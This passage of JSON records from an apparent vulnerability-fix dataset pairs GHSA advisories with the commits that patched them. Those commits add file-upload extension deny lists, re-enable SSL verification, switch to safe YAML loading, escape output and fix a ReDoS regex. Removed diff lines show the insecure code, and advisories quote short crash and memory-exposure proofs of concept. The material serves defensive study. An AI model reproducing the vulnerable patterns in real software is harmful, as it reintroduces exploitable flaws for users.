      "files": "{'eZ/Bundle/EzPublishCoreBundle/Resources/config/default_settings.yml': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https://github.com/ezsystems/ezpublish-kernel/raw/29fecd2afe86f763510f10c02f14962d028f311b/eZ%2FBundle%2FEzPublishCoreBundle%2FResources%2Fconfig%2Fdefault_settings.yml', 'patch': '@@ -89,6 +89,16 @@ parameters:\\n         - pht\\n         - phtml\\n         - pgif\\n+        - hta\\n+        - htm\\n+        - html\\n+        - xhtm\\n+        - xhtml\\n+        - jar\\n+        - js\\n+        - jse\\n+        - svg\\n+        - swf\\n \\n     # Content settings\\n     ezsettings.default.content.view_cache: true         # Whether to use content view cache or not (Etag/Last-Modified based)'}}",
      "message_norm": "merge pull request from ghsa-mrvj-7q4f-5p42\n\nco-authored-by: gunnstein lye <gunnstein.lye@ibexa.co>",
      "language": "en",
      "entities": "[('ghsa-mrvj-7q4f-5p42', 'VULNID', 'GHSA'), ('gunnstein.lye@ibexa.co', 'EMAIL', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['eZ/Bundle/EzPublishCoreBundle/Resources/config/default_settings.yml'])",
      "num_files": 1.0
    },
    {
      "index": 2449,
      "vuln_id": "GHSA-mq35-wqvf-r23c",
      "cwe_id": "{'CWE-79'}",
      "score": 6.1,
      "chain": "{'https://github.com/sinatra/sinatra/commit/12786867d6faaceaec62c7c2cb5b0e2dc074d71a'}",
      "dataset": "osv",
      "summary": "Sinatra has XSS via 400 Bad Request page via params parser exception Sinatra before 2.0.2 has XSS via the 400 Bad Request page that occurs upon a params parser exception.",
      "published_date": "2018-06-05",
      "chain_len": 1,
      "project": "https://github.com/sinatra/sinatra",
      "commit_href": "https://github.com/sinatra/sinatra/commit/12786867d6faaceaec62c7c2cb5b0e2dc074d71a",
      "commit_sha": "12786867d6faaceaec62c7c2cb5b0e2dc074d71a",
      "patch": "SINGLE",
      "chain_ord": "['12786867d6faaceaec62c7c2cb5b0e2dc074d71a']",
      "before_first_fix_commit": "{'5149dc9e0b0e281231b91223c6a414c905ad3a96'}",
      "last_fix_commit": "12786867d6faaceaec62c7c2cb5b0e2dc074d71a",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/30/2018, 16:05:27",
      "message": "escape invalid query params, fixes #1428",
      "author": "Kunpei Sakai",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'lib/sinatra/base.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/sinatra/sinatra/raw/12786867d6faaceaec62c7c2cb5b0e2dc074d71a/lib%2Fsinatra%2Fbase.rb', 'patch': '@@ -78,7 +78,7 @@ def unlink?\\n     def params\\n       super\\n     rescue Rack::Utils::ParameterTypeError, Rack::Utils::InvalidParameterError => e\\n-      raise BadRequest, \"Invalid query parameters: #{e.message}\"\\n+      raise BadRequest, \"Invalid query parameters: #{Rack::Utils.escape_html(e.message)}\"\\n     end\\n \\n     private'}}",
      "message_norm": "escape invalid query params, fixes #1428",
      "language": "ca",
      "entities": "[('escape', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#1428', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/sinatra/base.rb'])",
      "num_files": 1.0
    },
    {
      "index": 2602,
      "vuln_id": "GHSA-pm77-c4q7-3fwj",
      "cwe_id": "{'CWE-295'}",
      "score": 5.9,
      "chain": "{'https://github.com/globalpayments/php-sdk/pull/8/commits/c86e18f28c5eba0d6ede7d557756d978ea83d3c9'}",
      "dataset": "osv",
      "summary": "Improper Certificate Validation in Heartland & Global Payments PHP SDK Gateways/Gateway.php in Heartland & Global Payments PHP SDK before 2.0.0 does not enforce SSL certificate validations.",
      "published_date": "2021-10-12",
      "chain_len": 1,
      "project": "https://github.com/globalpayments/php-sdk",
      "commit_href": "https://github.com/globalpayments/php-sdk/pull/8/commits/c86e18f28c5eba0d6ede7d557756d978ea83d3c9",
      "commit_sha": "c86e18f28c5eba0d6ede7d557756d978ea83d3c9",
      "patch": "SINGLE",
      "chain_ord": "['c86e18f28c5eba0d6ede7d557756d978ea83d3c9']",
      "before_first_fix_commit": "{'b860aca9b7ed1aeb5a13b5ef52120f5d15efd2f7'}",
      "last_fix_commit": "c86e18f28c5eba0d6ede7d557756d978ea83d3c9",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/26/2019, 23:32:57",
      "message": "Remove unsecure CURLOPT_SSL_VERIFY* options\n\nVerification of peer certificate against trusted CAs and hostname verification should never be turned off otherwise MITM attacks are possible.",
      "author": "oldpec",
      "comments": null,
      "stats": "{'additions': 0, 'deletions': 2, 'total': 2}",
      "files": "{'src/Gateways/Gateway.php': {'additions': 0, 'deletions': 2, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/globalpayments/php-sdk/raw/c86e18f28c5eba0d6ede7d557756d978ea83d3c9/src%2FGateways%2FGateway.php', 'patch': '@@ -77,8 +77,6 @@ protected function sendRequest(\\n             curl_setopt($request, CURLOPT_CONNECTTIMEOUT, $this->timeout);\\n             curl_setopt($request, CURLOPT_TIMEOUT, $this->timeout);\\n             curl_setopt($request, CURLOPT_RETURNTRANSFER, true);\\n-            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, false); //true,);\\n-            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, false); //2,);\\n             curl_setopt($request, CURLOPT_CUSTOMREQUEST, strtoupper($verb));\\n             curl_setopt($request, CURLOPT_POSTFIELDS, $data);\\n             curl_setopt($request, CURLOPT_HTTPHEADER, $headers);'}}",
      "message_norm": "remove unsecure curlopt_ssl_verify* options\n\nverification of peer certificate against trusted cas and hostname verification should never be turned off otherwise mitm attacks are possible.",
      "language": "en",
      "entities": "[('remove', 'ACTION', ''), ('unsecure', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('hostname', 'SECWORD', ''), ('mitm', 'SECWORD', ''), ('attacks', 'FLAW', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/Gateways/Gateway.php'])",
      "num_files": 1.0
    },
    {
      "index": 2413,
      "vuln_id": "GHSA-mg5h-9rhq-4cqx",
      "cwe_id": "{'CWE-79'}",
      "score": 5.4,
      "chain": "{'https://github.com/star7th/showdoc/commit/42c0d9813df3035728b36116a6ce9116e6fa8ed3'}",
      "dataset": "osv",
      "summary": "Cross-site Scripting in ShowDoc ShowDoc is vulnerable to stored cross-site scripting through file upload in versions 2.10.3 and prior. A patch is available and anticipated to be part of version 2.10.4.",
      "published_date": "2022-03-15",
      "chain_len": 1,
      "project": "https://github.com/star7th/showdoc",
      "commit_href": "https://github.com/star7th/showdoc/commit/42c0d9813df3035728b36116a6ce9116e6fa8ed3",
      "commit_sha": "42c0d9813df3035728b36116a6ce9116e6fa8ed3",
      "patch": "SINGLE",
      "chain_ord": "['42c0d9813df3035728b36116a6ce9116e6fa8ed3']",
      "before_first_fix_commit": "{'818d7fe731f452acccacf731ce47ec27ad68049c'}",
      "last_fix_commit": "42c0d9813df3035728b36116a6ce9116e6fa8ed3",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/13/2022, 02:27:22",
      "message": "file upload bug",
      "author": "star7th",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 0, 'total': 1}",
      "files": "{'server/Application/Api/Model/AttachmentModel.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https://github.com/star7th/showdoc/raw/42c0d9813df3035728b36116a6ce9116e6fa8ed3/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -300,6 +300,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t $isDangerStr($filename , \".php\")\\n \\t\\t\\t|| $isDangerStr($filename , \".svg\")\\n \\t\\t\\t|| $isDangerStr($filename , \".htm\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".shtm\")\\n \\t\\t\\t|| $isDangerStr($filename , \"%\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xml\")\\n \\t\\t) {'}}",
      "message_norm": "file upload bug",
      "language": "ro",
      "entities": "[('bug', 'FLAW', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['server/Application/Api/Model/AttachmentModel.class.php'])",
      "num_files": 1.0
    },
    {
      "index": 2380,
      "vuln_id": "GHSA-m87f-9fvv-2mgg",
      "cwe_id": "{'CWE-502'}",
      "score": 8.4,
      "chain": "{'https://github.com/facebookresearch/ParlAI/commit/4374fa2aba383db6526ab36e939eb1cf8ef99879', 'https://github.com/facebookresearch/ParlAI/commit/507d066ef432ea27d3e201da08009872a2f37725'}",
      "dataset": "osv",
      "summary": "Deserialization of Untrusted Data in parlai ### Impact\nDue to use of unsafe YAML deserialization logic, an attacker with the ability to modify local YAML configuration files could provide malicious input, resulting in remote code execution or similar risks.\n\n### Patches\nThe issue can be patched by upgrading to v1.1.0 or later. It can also be patched by replacing YAML deserialization with equivalent safe_load calls.\n\n### References\n\n- https://github.com/facebookresearch/ParlAI/commit/507d066ef432ea27d3e201da08009872a2f37725\n- https://github.com/facebookresearch/ParlAI/commit/4374fa2aba383db6526ab36e939eb1cf8ef99879\n- https://anon-artist.github.io/blogs/blog3.html",
      "published_date": "2021-09-13",
      "chain_len": 2,
      "project": "https://github.com/facebookresearch/ParlAI",
      "commit_href": "https://github.com/facebookresearch/ParlAI/commit/507d066ef432ea27d3e201da08009872a2f37725",
      "commit_sha": "507d066ef432ea27d3e201da08009872a2f37725",
      "patch": "MULTI",
      "chain_ord": "['507d066ef432ea27d3e201da08009872a2f37725', '4374fa2aba383db6526ab36e939eb1cf8ef99879']",
      "before_first_fix_commit": "{'15fbf55f32e64722c452c907425e10fdb977f62e'}",
      "last_fix_commit": "4374fa2aba383db6526ab36e939eb1cf8ef99879",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/26/2021, 21:06:01",
      "message": "RCE Fixed (#3402)\n\nCo-authored-by: Anon-Artist <61599526+Anon-Artist@users.noreply.github.com>\r\nCo-authored-by: Jamie Slome <jamie@418sec.com>",
      "author": "huntr.dev | the place to protect open source",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'parlai/chat_service/utils/config.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/facebookresearch/ParlAI/raw/507d066ef432ea27d3e201da08009872a2f37725/parlai%2Fchat_service%2Futils%2Fconfig.py', 'patch': '@@ -36,7 +36,7 @@ def parse_configuration_file(config_path):\\n     result = {}\\n     result[\"configs\"] = {}\\n     with open(config_path) as f:\\n-        cfg = yaml.load(f.read(), Loader=yaml.FullLoader)\\n+        cfg = yaml.load(f.read(), Loader=yaml.SafeLoader)\\n         # get world path\\n         result[\"world_path\"] = cfg.get(\"world_module\")\\n         if not result[\"world_path\"]:'}}",
      "message_norm": "rce fixed (#3402)\n\nco-authored-by: anon-artist <61599526+anon-artist@users.noreply.github.com>\r\nco-authored-by: jamie slome <jamie@418sec.com>",
      "language": "en",
      "entities": "[('fixed', 'ACTION', ''), ('#3402', 'ISSUE', ''), ('jamie@418sec.com', 'EMAIL', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['parlai/chat_service/utils/config.py'])",
      "num_files": 1.0
    },
    {
      "index": 327,
      "vuln_id": "GHSA-3xc7-xg67-pw99",
      "cwe_id": "{'CWE-532'}",
      "score": 3.5,
      "chain": "{'https://github.com/FelixLC/cli/commit/da59652c061a798282e18efad0b6d0afefa15465'}",
      "dataset": "osv",
      "summary": "Sensitive Data Exposure in sequelize-cli Versions of `sequelize-cli` prior to 5.5.0 are vulnerable to Sensitive Data Exposure. The function `filteredURL()` does not properly sanitize the `config.password` value which may cause passwords with special characters to be logged in plain text.\n\n\n## Recommendation\n\nUpgrade to version 5.5.0 or later.",
      "published_date": "2019-06-05",
      "chain_len": 1,
      "project": "https://github.com/FelixLC/cli",
      "commit_href": "https://github.com/FelixLC/cli/commit/da59652c061a798282e18efad0b6d0afefa15465",
      "commit_sha": "da59652c061a798282e18efad0b6d0afefa15465",
      "patch": "SINGLE",
      "chain_ord": "['da59652c061a798282e18efad0b6d0afefa15465']",
      "before_first_fix_commit": "{'139f854f05b76367a0bb5bfcc5a9cf549879f432'}",
      "last_fix_commit": "da59652c061a798282e18efad0b6d0afefa15465",
      "chain_ord_pos": 1.0,
      "commit_datetime": "12/04/2018, 10:53:36",
      "message": "Bug Fix: Special characters in password are not escaped\n\nhttps://github.com/sequelize/cli/issues/172 is stil open when special characters find their way in a password",
      "author": "FelixLC",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'src/helpers/config-helper.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/FelixLC/cli/raw/da59652c061a798282e18efad0b6d0afefa15465/src%2Fhelpers%2Fconfig-helper.js', 'patch': \"@@ -152,7 +152,7 @@ const api = {\\n   },\\n \\n   filteredUrl (uri, config) {\\n-    const regExp = new RegExp(':?' + (config.password || '') + '@');\\n+    const regExp = new RegExp(':?' + _.escapeRegExp(config.password) + '@');\\n     return uri.replace(regExp, ':*****@');\\n   },\"}}",
      "message_norm": "bug fix: special characters in password are not escaped\n\nhttps://github.com/sequelize/cli/issues/172 is stil open when special characters find their way in a password",
      "language": "en",
      "entities": "[('bug', 'FLAW', ''), ('password', 'SECWORD', ''), ('escaped', 'SECWORD', ''), ('https://github.com/sequelize/cli/issues/172', 'URL', ''), ('password', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['src/helpers/config-helper.js'])",
      "num_files": 1.0
    },
    {
      "index": 3489,
      "vuln_id": "GHSA-xrp2-fhq4-4q3w",
      "cwe_id": "{'CWE-20'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5'}",
      "dataset": "osv",
      "summary": "Segfault if `tf.histogram_fixed_width` is called with NaN values in TensorFlow ### Impact\nThe implementation of [`tf.histogram_fixed_width`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc) is vulnerable to a crash when the values array contain `NaN` elements:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.histogram_fixed_width(values=np.nan, value_range=[1,2])\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc#L35-L74) assumes that all floating point operations are defined and then converts a floating point result to an integer index:\n\n```cc\nindex_to_bin.device(d) =\n    ((values.cwiseMax(value_range(0)) - values.constant(value_range(0)))\n         .template cast<double>() /\n     step)\n        .cwiseMin(nbins_minus_1)\n        .template cast<int32>();\n```\n\nIf `values` contains `NaN` then the result of the division is still `NaN` and the cast to `int32` would result in a crash.\n\nThis only occurs on the CPU implementation.\n\n### Patches\nWe have patched the issue in GitHub commit [e57fd691c7b0fd00ea3bfe43444f30c1969748b5](https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/45770).",
      "published_date": "2022-05-24",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5",
      "commit_sha": "e57fd691c7b0fd00ea3bfe43444f30c1969748b5",
      "patch": "SINGLE",
      "chain_ord": "['e57fd691c7b0fd00ea3bfe43444f30c1969748b5']",
      "before_first_fix_commit": "{'484b5e8836454dbc93380176ae5eeeab02cc63c0'}",
      "last_fix_commit": "e57fd691c7b0fd00ea3bfe43444f30c1969748b5",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/20/2022, 18:35:47",
      "message": "Prevent crash when histogram is called with NaN values.\n\nFixes #45770\n\nPiperOrigin-RevId: 443149951",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 11, 'deletions': 2, 'total': 13}",
      "files": "{'tensorflow/core/kernels/histogram_op.cc': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/e57fd691c7b0fd00ea3bfe43444f30c1969748b5/tensorflow%2Fcore%2Fkernels%2Fhistogram_op.cc', 'patch': '@@ -50,6 +50,15 @@ struct HistogramFixedWidthFunctor<CPUDevice, T, Tout> {\\n                         static_cast<double>(nbins);\\n     const double nbins_minus_1 = static_cast<double>(nbins - 1);\\n \\n+    // We cannot handle NANs in the algorithm below (due to the case to int32)\\n+    const Eigen::Tensor<int32, 1, 1> nans_tensor =\\n+        values.isnan().template cast<int32>();\\n+    const Eigen::Tensor<int32, 0, 1> reduced_tensor = nans_tensor.sum();\\n+    const int num_nans = reduced_tensor(0);\\n+    if (num_nans > 0) {\\n+      return errors::InvalidArgument(\"Histogram values must not contain NaN\");\\n+    }\\n+\\n     // The calculation is done by finding the slot of each value in `values`.\\n     // With [a, b]:\\n     //   step = (b - a) / nbins\\n@@ -98,12 +107,12 @@ class HistogramFixedWidthOp : public OpKernel {\\n     const auto nbins = nbins_tensor.scalar<int32>()();\\n \\n     OP_REQUIRES(\\n-        ctx, (value_range(0) < value_range(1)),\\n+        ctx, value_range(0) < value_range(1),\\n         errors::InvalidArgument(\"value_range should satisfy value_range[0] < \"\\n                                 \"value_range[1], but got \\'[\",\\n                                 value_range(0), \", \", value_range(1), \"]\\'\"));\\n     OP_REQUIRES(\\n-        ctx, (nbins > 0),\\n+        ctx, nbins > 0,\\n         errors::InvalidArgument(\"nbins should be a positive number, but got \\'\",\\n                                 nbins, \"\\'\"));'}}",
      "message_norm": "prevent crash when histogram is called with nan values.\n\nfixes #45770\n\npiperorigin-revid: 443149951",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('fixes', 'ACTION', ''), ('#45770', 'ISSUE', ''), ('443149951', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/histogram_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 3160,
      "vuln_id": "GHSA-vqj2-4v8m-8vrq",
      "cwe_id": "{'CWE-377', 'CWE-668'}",
      "score": 8.2,
      "chain": "{'https://github.com/mlflow/mlflow/commit/61984e6843d2e59235d82a580c529920cd8f3711'}",
      "dataset": "osv",
      "summary": "Insecure Temporary File in mlflow mlflow prior to 1.23.1 contains an insecure temporary file. The insecure function `tempfile.mktemp()` is deprecated and `mkstemp()` should be used instead.",
      "published_date": "2022-02-24",
      "chain_len": 1,
      "project": "https://github.com/mlflow/mlflow",
      "commit_href": "https://github.com/mlflow/mlflow/commit/61984e6843d2e59235d82a580c529920cd8f3711",
      "commit_sha": "61984e6843d2e59235d82a580c529920cd8f3711",
      "patch": "SINGLE",
      "chain_ord": "['61984e6843d2e59235d82a580c529920cd8f3711']",
      "before_first_fix_commit": "{'271750bc2a65f469956a11499c022df138c6d0f6'}",
      "last_fix_commit": "61984e6843d2e59235d82a580c529920cd8f3711",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/26/2022, 23:59:23",
      "message": "Use mkstemp to replace deprecated mktemp call (#5303)\n\n* Use mkstemp\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Remove num examples\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Close instead of remove\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Close the handle\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>",
      "author": "Corey Zumar",
      "comments": "{'com_1': {'author': 'sr-mpamera', 'datetime': '03/02/2022, 15:40:16', 'body': 'The security check fails even though the mlflow is upgraded to 1.23.1. It gives the error \"Insecure Temporary File in mlflow\".\\r\\nAny suggested solution please ?'}}",
      "stats": "{'additions': 2, 'deletions': 2, 'total': 4}",
      "files": "{'mlflow/utils/file_utils.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/mlflow/mlflow/raw/61984e6843d2e59235d82a580c529920cd8f3711/mlflow%2Futils%2Ffile_utils.py', 'patch': '@@ -287,7 +287,7 @@ def _filter_timestamps(tar_info):\\n         tar_info.mtime = 0\\n         return tar_info if custom_filter is None else custom_filter(tar_info)\\n \\n-    unzipped_filename = tempfile.mktemp()\\n+    unzipped_file_handle, unzipped_filename = tempfile.mkstemp()\\n     try:\\n         with tarfile.open(unzipped_filename, \"w\") as tar:\\n             tar.add(source_dir, arcname=archive_name, filter=_filter_timestamps)\\n@@ -298,7 +298,7 @@ def _filter_timestamps(tar_info):\\n         ) as gzipped_tar, open(unzipped_filename, \"rb\") as tar:\\n             gzipped_tar.write(tar.read())\\n     finally:\\n-        os.remove(unzipped_filename)\\n+        os.close(unzipped_file_handle)\\n \\n \\n def _copy_project(src_path, dst_path=\"\"):'}}",
      "message_norm": "use mkstemp to replace deprecated mktemp call (#5303)\n\n* use mkstemp\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* remove num examples\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* close instead of remove\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* close the handle\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>",
      "language": "en",
      "entities": "[('#5303', 'ISSUE', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('remove', 'ACTION', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('remove', 'ACTION', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('corey.zumar@databricks.com', 'EMAIL', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['mlflow/utils/file_utils.py'])",
      "num_files": 1.0
    },
    {
      "index": 1017,
      "vuln_id": "GHSA-7f53-fmmv-mfjv",
      "cwe_id": "{'CWE-400'}",
      "score": 7.5,
      "chain": "{'https://github.com/facebook/react-native/commit/ca09ae82715e33c9ac77b3fa55495cf84ba891c7'}",
      "dataset": "osv",
      "summary": "Regular expression denial of service in react-native A regular expression denial of service (ReDoS) vulnerability in the validateBaseUrl function can cause the application to use excessive resources, become unresponsive, or crash. This was introduced in react-native version 0.59.0 and fixed in version 0.64.1.",
      "published_date": "2021-07-20",
      "chain_len": 1,
      "project": "https://github.com/facebook/react-native",
      "commit_href": "https://github.com/facebook/react-native/commit/ca09ae82715e33c9ac77b3fa55495cf84ba891c7",
      "commit_sha": "ca09ae82715e33c9ac77b3fa55495cf84ba891c7",
      "patch": "SINGLE",
      "chain_ord": "['ca09ae82715e33c9ac77b3fa55495cf84ba891c7']",
      "before_first_fix_commit": "{'166a5ddf88aca0d0235e48c624681eec095e9ef8'}",
      "last_fix_commit": "ca09ae82715e33c9ac77b3fa55495cf84ba891c7",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/29/2021, 21:51:29",
      "message": "Update validateBaseUrl to use latest regex\n\nSummary:\nUpdating the regex to avoid a potential regular expression denial-of-service vulnerability.\n\nChangelog: Update validateBaseUrl to use a more robust regular expression. Fixes CVE-2020-1920, GHSL-2020-293\n\nReviewed By: lunaleaps\n\nDifferential Revision: D25507604\n\nfbshipit-source-id: c36a03c456881bc655c861e1a2c5cd41a7127c9d",
      "author": "Neal Poole",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'Libraries/Blob/URL.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/facebook/react-native/raw/ca09ae82715e33c9ac77b3fa55495cf84ba891c7/Libraries%2FBlob%2FURL.js', 'patch': '@@ -107,7 +107,7 @@ export class URLSearchParams {\\n \\n function validateBaseUrl(url: string) {\\n   // from this MIT-licensed gist: https://gist.github.com/dperini/729294\\n-  return /^(?:(?:(?:https?|ftp):)?\\\\/\\\\/)(?:(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff0-9]-*)*[a-z\\\\u00a1-\\\\uffff0-9]+)*(?:\\\\.(?:[a-z\\\\u00a1-\\\\uffff]{2,}))?)(?::\\\\d{2,5})?(?:[/?#]\\\\S*)?$/i.test(\\n+  return /^(?:(?:(?:https?|ftp):)?\\\\/\\\\/)(?:(?:[1-9]\\\\d?|1\\\\d\\\\d|2[01]\\\\d|22[0-3])(?:\\\\.(?:1?\\\\d{1,2}|2[0-4]\\\\d|25[0-5])){2}(?:\\\\.(?:[1-9]\\\\d?|1\\\\d\\\\d|2[0-4]\\\\d|25[0-4]))|(?:(?:[a-z0-9\\\\u00a1-\\\\uffff][a-z0-9\\\\u00a1-\\\\uffff_-]{0,62})?[a-z0-9\\\\u00a1-\\\\uffff]\\\\.)*(?:[a-z\\\\u00a1-\\\\uffff]{2,}\\\\.?))(?::\\\\d{2,5})?(?:[/?#]\\\\S*)?$/.test(\\n     url,\\n   );\\n }'}}",
      "message_norm": "update validatebaseurl to use latest regex\n\nsummary:\nupdating the regex to avoid a potential regular expression denial-of-service vulnerability.\n\nchangelog: update validatebaseurl to use a more robust regular expression. fixes cve-2020-1920, ghsl-2020-293\n\nreviewed by: lunaleaps\n\ndifferential revision: d25507604\n\nfbshipit-source-id: c36a03c456881bc655c861e1a2c5cd41a7127c9d",
      "language": "en",
      "entities": "[('update', 'ACTION', ''), ('updating', 'ACTION', ''), ('denial-of-service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('update', 'ACTION', ''), ('cve-2020-1920', 'VULNID', 'CVE'), ('d25507604', 'SHA', 'generic_sha'), ('c36a03c456881bc655c861e1a2c5cd41a7127c9d', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['Libraries/Blob/URL.js'])",
      "num_files": 1.0
    },
    {
      "index": 284,
      "vuln_id": "GHSA-3p92-886g-qxpq",
      "cwe_id": "{'CWE-201'}",
      "score": 5.1,
      "chain": "{'https://github.com/soldair/node-floody/commit/6c44722312131f4ac8a1af40f0f861c85efe01b0'}",
      "dataset": "osv",
      "summary": "Remote Memory Exposure in floody Versions of `floody` before 0.1.1 are vulnerable to remote memory exposure.\n\n.write(number)` in the affected `floody` versions passes a number to Buffer constructor, appending a chunk of uninitialized memory.\n\nProof of Concept: \n\n```\nvar f = require('floody')(process.stdout); \nf.write(USERSUPPLIEDINPUT); \n'f.stop();\n\n\n## Recommendation\n\nUpdate to version 0.1.1 or later.",
      "published_date": "2019-06-04",
      "chain_len": 1,
      "project": "https://github.com/soldair/node-floody",
      "commit_href": "https://github.com/soldair/node-floody/commit/6c44722312131f4ac8a1af40f0f861c85efe01b0",
      "commit_sha": "6c44722312131f4ac8a1af40f0f861c85efe01b0",
      "patch": "SINGLE",
      "chain_ord": "['6c44722312131f4ac8a1af40f0f861c85efe01b0']",
      "before_first_fix_commit": "{'2a150c5552b8ce2f2a12ae4a3fd33882d5827afd'}",
      "last_fix_commit": "6c44722312131f4ac8a1af40f0f861c85efe01b0",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/15/2016, 13:27:13",
      "message": "adding fix for exposing uninitalized memory found by @chalker",
      "author": "Ryan Day",
      "comments": "{'com_1': {'author': 'ChALkeR', 'datetime': '01/15/2016, 20:42:58', 'body': \"POC: `var f = require('floody')(process.stdout); f.write(1000); f.stop();`.\"}}",
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/soldair/node-floody/raw/6c44722312131f4ac8a1af40f0f861c85efe01b0/index.js', 'patch': \"@@ -28,7 +28,7 @@ module.exports = function(options){\\n \\n     if(writes.length > windowSize) writes.shift();\\n \\n-    data = data instanceof Buffer ? data : new Buffer(data);\\n+    data = data instanceof Buffer ? data : new Buffer(data+'');\\n     bufLen += data.length;\\n \\n     buf.push(data);\"}}",
      "message_norm": "adding fix for exposing uninitalized memory found by @chalker",
      "language": "en",
      "entities": "[('adding', 'ACTION', ''), ('uninitalized memory', 'SECWORD', ''), ('found', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['index.js'])",
      "num_files": 1.0
    },
    {
      "index": 82,
      "vuln_id": "GHSA-2cpx-427x-q2c6",
      "cwe_id": "{'CWE-190'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c'}",
      "dataset": "osv",
